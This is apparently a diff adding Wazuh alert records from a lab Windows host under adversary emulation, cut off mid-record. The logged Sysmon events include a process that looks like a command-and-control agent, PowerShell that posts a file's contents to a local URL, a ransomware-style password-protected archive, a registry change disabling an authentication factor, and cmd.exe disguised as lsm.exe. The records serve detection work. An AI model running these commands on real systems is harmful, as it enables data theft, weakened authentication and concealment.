+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:33:52.617\r\nProcessGuid: {994437b3-0800-68c3-bc27-000000000e00}\r\nProcessId: 10384\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe /C path=%%path%%;\"C:\\Program Files (x86)\\winzip\" && mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%%ProgramFiles%%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip * && dir\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nParentProcessId: 10580\r\nParentImage: C:\\Users\\Public\\splunkd.exe\r\nParentCommandLine: \"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.1.90:8888 -group red \r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:33:52.6224693Z",
+            "eventRecordID": "9941",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 22,
+        "mail": false,
+        "level": 4,
+        "description": "Windows command prompt started by an abnormal process",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Windows Command Shell"
+          ],
+          "id": [
+            "T1059.003"
+          ],
+          "tactic": [
+            "Execution"
+          ]
+        },
+        "id": "92052"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612033.1626234",
+      "timestamp": "2025-09-11T17:33:53.676+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:33:53.676Z"
+      ]
+    },
+    "sort": [
+      1757612033676
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "U0fWOZkBIDwfn7_zYKrr",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "PowerShell.EXE",
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
+            "description": "Windows PowerShell",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://192.168.1.90:8888 -group red",
+            "processGuid": "{994437b3-07c1-68c3-bb27-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "10580",
+            "processId": "10764",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:32:49.605",
+            "hashes": "MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D",
+            "parentImage": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"$content = Get-Content C:\\\\Windows\\\\System32\\\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:32:49.605\r\nProcessGuid: {994437b3-07c1-68c3-bb27-000000000e00}\r\nProcessId: 10764\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D\r\nParentProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nParentProcessId: 10580\r\nParentImage: C:\\Users\\Public\\splunkd.exe\r\nParentCommandLine: \"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.1.90:8888 -group red \r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:32:49.6076212Z",
+            "eventRecordID": "9939",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 2,
+        "mail": false,
+        "level": 3,
+        "description": "Powershell was used to delete files or directories",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "File Deletion"
+          ],
+          "id": [
+            "T1070.004"
+          ],
+          "tactic": [
+            "Defense Evasion"
+          ]
+        },
+        "id": "92021"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611970.1617034",
+      "timestamp": "2025-09-11T17:32:50.656+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:32:50.656Z"
+      ]
+    },
+    "sort": [
+      1757611970656
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "S0fTOZkBIDwfn7_zeqp8",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "reg.exe",
+            "image": "C:\\\\Windows\\\\System32\\\\reg.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-06fd-68c3-b427-000000000e00}",
+            "description": "Registry Console Tool",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "cmd.exe /C reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SecondaryAuthenticationFactor\\\" /v \\\"AllowSecondaryAuthenticationDevice\\\" /t REG_DWORD /d 0 /f",
+            "processGuid": "{994437b3-06fd-68c3-b527-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "8764",
+            "processId": "8420",
+            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+            "utcTime": "2025-09-11 17:29:33.166",
+            "hashes": "MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "reg  add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SecondaryAuthenticationFactor\\\" /v \\\"AllowSecondaryAuthenticationDevice\\\" /t REG_DWORD /d 0 /f",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:29:33.166\r\nProcessGuid: {994437b3-06fd-68c3-b527-000000000e00}\r\nProcessId: 8420\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: reg  add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D\r\nParentProcessGuid: {994437b3-06fd-68c3-b427-000000000e00}\r\nParentProcessId: 8764\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:29:33.1687329Z",
+            "eventRecordID": "9932",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 3,
+        "mail": false,
+        "level": 10,
+        "description": "Value added to registry key has Base64-like pattern",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Obfuscated Files or Information",
+            "Modify Registry"
+          ],
+          "id": [
+            "T1027",
+            "T1112"
+          ],
+          "tactic": [
+            "Defense Evasion"
+          ]
+        },
+        "id": "92041"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611774.1589886",
+      "timestamp": "2025-09-11T17:29:34.263+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:29:34.263Z"
+      ]
+    },
+    "sort": [
+      1757611774263
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "REfQOZkBIDwfn7_zp6rt",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "processGuid": "{994437b3-0644-68c3-ad27-000000000e00}",
+            "processId": "10596",
+            "utcTime": "2025-09-11 17:26:29.775",
+            "targetFilename": "C:\\\\Users\\\\env-admin\\\\Downloads\\\\T1036\\\\README.cmd",
+            "ruleName": "Downloads",
+            "creationUtcTime": "2025-09-11 17:26:29.775",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: Downloads\r\nUtcTime: 2025-09-11 17:26:29.775\r\nProcessGuid: {994437b3-0644-68c3-ad27-000000000e00}\r\nProcessId: 10596\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\env-admin\\Downloads\\T1036\\README.cmd\r\nCreationUtcTime: 2025-09-11 17:26:29.775\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:26:29.7843690Z",
+            "eventRecordID": "9918",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 9,
+        "description": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe created a new scripting file under Windows Temp or User data folder",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer",
+            "Command and Scripting Interpreter"
+          ],
+          "id": [
+            "T1105",
+            "T1059"
+          ],
+          "tactic": [
+            "Command and Control",
+            "Execution"
+          ]
+        },
+        "id": "92201"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611590.1558176",
+      "timestamp": "2025-09-11T17:26:30.527+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:26:30.527Z"
+      ]
+    },
+    "sort": [
+      1757611590527
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "QkfPOZkBIDwfn7_zqarl",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "Cmd.Exe",
+            "image": "C:\\\\lsm.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-0604-68c3-ab27-000000000e00}",
+            "description": "Windows Command Processor",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "cmd.exe /C copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\lsm.exe &amp;&amp; C:\\\\lsm.exe /c echo T1036.003 &gt; C:\\\\T1036.003.txt",
+            "processGuid": "{994437b3-0604-68c3-ac27-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "10800",
+            "processId": "5880",
+            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+            "utcTime": "2025-09-11 17:25:24.057",
+            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "C:\\\\lsm.exe  /c echo T1036.003",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:25:24.057\r\nProcessGuid: {994437b3-0604-68c3-ac27-000000000e00}\r\nProcessId: 5880\r\nImage: C:\\lsm.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\lsm.exe  /c echo T1036.003 \r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-0604-68c3-ab27-000000000e00}\r\nParentProcessId: 10800\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:25:24.0682360Z",
+            "eventRecordID": "9913",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": true,
+        "level": 12,
+        "pci_dss": [
+          "10.6.1",
+          "11.4"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC7.2",
+          "CC7.3",
+          "CC6.1",
+          "CC6.8"
+        ],
+        "description": "Sysmon - Suspicious Process - lsm.exe",
+        "groups": [
+          "windows",
+          "sysmon",
+          "sysmon_process-anomalies"
+        ],
+        "mitre": {
+          "technique": [
+            "Process Injection"
+          ],
+          "id": [
+            "T1055"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Privilege Escalation"
+          ]
+        },
+        "id": "61620",
+        "nist_800_53": [
+          "AU.6",
+          "SI.4"
+        ],
+        "gdpr": [
+          "IV_35.7.d"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611525.1549468",
+      "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2025-09-11T17:25:24.0682360Z\",\"eventRecordID\":\"9913\",\"processID\":\"3544\",\"threadID\":\"4804\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"DESKTOP-MDNNEJF\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2025-09-11 17:25:24.057\\r\\nProcessGuid: {994437b3-0604-68c3-ac27-000000000e00}\\r\\nProcessId: 5880\\r\\nImage: C:\\\\lsm.exe\\r\\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: C:\\\\lsm.exe  /c echo T1036.003 \\r\\nCurrentDirectory: C:\\\\Windows\\\\System32\\\\\\r\\nUser: DESKTOP-MDNNEJF\\\\env-admin\\r\\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\\r\\nLogonId: 0x7E095\\r\\nTerminalSessionId: 1\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\\r\\nParentProcessGuid: {994437b3-0604-68c3-ab27-000000000e00}\\r\\nParentProcessId: 10800\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: cmd.exe /C copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\lsm.exe && C:\\\\lsm.exe /c echo T1036.003 > C:\\\\T1036.003.txt\\r\\nParentUser: DESKTOP-MDNNEJF\\\\env-admin\\\"\"},\"eventdata\":{\"utcTime\":\"2025-09-11 17:25:24.057\",\"processGuid\":\"{994437b3-0604-68c3-ac27-000000000e00}\",\"processId\":\"5880\",\"image\":\"C:\\\\\\\\lsm.exe\",\"fileVersion\":\"10.0.22621.608 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft® Windows® Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"C:\\\\\\\\lsm.exe  /c echo T1036.003\",\"currentDirectory\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\\",\"user\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\",\"logonGuid\":\"{994437b3-7451-68b8-95e0-070000000000}\",\"logonId\":\"0x7e095\",\"terminalSessionId\":\"1\",\"integrityLevel\":\"High\",\"hashes\":\"MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\",\"parentProcessGuid\":\"{994437b3-0604-68c3-ab27-000000000e00}\",\"parentProcessId\":\"10800\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /C copy C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe C:\\\\\\\\lsm.exe &amp;&amp; C:\\\\\\\\lsm.exe /c echo T1036.003 &gt; C:\\\\\\\\T1036.003.txt\",\"parentUser\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\"}}}",
+      "timestamp": "2025-09-11T17:25:25.132+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:25:25.132Z"
+      ]
+    },
+    "sort": [
+      1757611525132
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "skf0OZkBIDwfn7_zdKrD",
+    "_score": null,
+    "_source": {
+      "syscheck": {
+        "mode": "scheduled",
+        "path": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "value_type": "REG_SZ",
+        "sha1_after": "7647917caebd9ee2a1c98925b62733b820d465a0",
+        "size_after": "162",
+        "arch": "[x64]",
+        "event": "added",
+        "md5_after": "1cca22d07dd42056fb211bc676e4acc3",
+        "sha256_after": "f3f9f7b5d68bf99157dc44df8b809da9d6ba23d1c61223b4a82f6a1b26daed84",
+        "value_name": "NextRun"
+      },
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "11.5"
+        ],
+        "hipaa": [
+          "164.312.c.1",
+          "164.312.c.2"
+        ],
+        "tsc": [
+          "PI1.4",
+          "PI1.5",
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Registry Value Entry Added to the System",
+        "groups": [
+          "ossec",
+          "syscheck",
+          "syscheck_entry_added",
+          "syscheck_registry"
+        ],
+        "nist_800_53": [
+          "SI.7"
+        ],
+        "gdpr": [
+          "II_5.1.f"
+        ],
+        "firedtimes": 7,
+        "mitre": {
+          "technique": [
+            "Modify Registry"
+          ],
+          "id": [
+            "T1112"
+          ],
+          "tactic": [
+            "Defense Evasion"
+          ]
+        },
+        "id": "752",
+        "gpg13": [
+          "4.13"
+        ]
+      },
+      "location": "syscheck",
+      "decoder": {
+        "name": "syscheck_registry_value_added"
+      },
+      "id": "1757613944.1876416",
+      "full_log": "Registry Value '[x64] HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun' added\nMode: scheduled\n",
+      "timestamp": "2025-09-11T18:05:44.834+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T18:05:44.834Z"
+      ]
+    },
+    "sort": [
+      1757613944834
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "sUf0OZkBIDwfn7_zdKrD",
+    "_score": null,
+    "_source": {
+      "syscheck": {
+        "mode": "scheduled",
+        "path": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "changed_attributes": [
+          "mtime"
+        ],
+        "uname_after": "SYSTEM",
+        "gname_after": "SYSTEM",
+        "mtime_after": "2025-09-11T17:28:45",
+        "uid_after": "S-1-5-18",
+        "gid_after": "S-1-5-18",
+        "arch": "[x64]",
+        "win_perm_after": [
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              [
+                "GENERIC_ALL",
+                "DELETE",
+                "READ_CONTROL",
+                "WRITE_DAC",
+                "WRITE_OWNER",
+                "READ_DATA",
+                "WRITE_DATA",
+                "APPEND_DATA",
+                "READ_EA",
+                "WRITE_EA",
+                "EXECUTE"
+              ],
+              [
+                "GENERIC_ALL",
+                "DELETE",
+                "READ_CONTROL",
+                "WRITE_DAC",
+                "WRITE_OWNER",
+                "READ_DATA",
+                "WRITE_DATA",
+                "APPEND_DATA",
+                "READ_EA",
+                "WRITE_EA",
+                "EXECUTE"
+              ],
+              [
+                "GENERIC_ALL"
+              ],
+              [
+                "GENERIC_READ",
+                "READ_CONTROL",
+                "READ_DATA",
+                "READ_EA",
+                "WRITE_EA"
+              ],
+              [
+                "GENERIC_READ",
+                "READ_CONTROL",
+                "READ_DATA",
+                "READ_EA",
+                "WRITE_EA"
+              ]
+            ],
+            "name": "Utilisateurs"
+          },
+          {
+            "allowed": [
+              "GENERIC_ALL",
+              "DELETE",
+              "READ_CONTROL",
+              "WRITE_DAC",
+              "WRITE_OWNER",
+              "READ_DATA",
+              "WRITE_DATA",
+              "APPEND_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              "EXECUTE"
+            ],
+            "name": "Administrateurs"
+          },
+          {
+            "allowed": [
+              "GENERIC_ALL",
+              "DELETE",
+              "READ_CONTROL",
+              "WRITE_DAC",
+              "WRITE_OWNER",
+              "READ_DATA",
+              "WRITE_DATA",
+              "APPEND_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              "EXECUTE"
+            ],
+            "name": "SYSTEM"
+          },
+          {
+            "allowed": [
+              "GENERIC_ALL"
+            ],
+            "name": "CREATOR OWNER"
+          },
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA"
+            ],
+            "name": "ALL APPLICATION PACKAGES"
+          },
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA"
+            ],
+            "name": "S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681"
+          }
+        ],
+        "mtime_before": "2022-05-07T05:27:58",
+        "event": "modified"
+      },
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "11.5"
+        ],
+        "hipaa": [
+          "164.312.c.1",
+          "164.312.c.2"
+        ],
+        "tsc": [
+          "PI1.4",
+          "PI1.5",
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
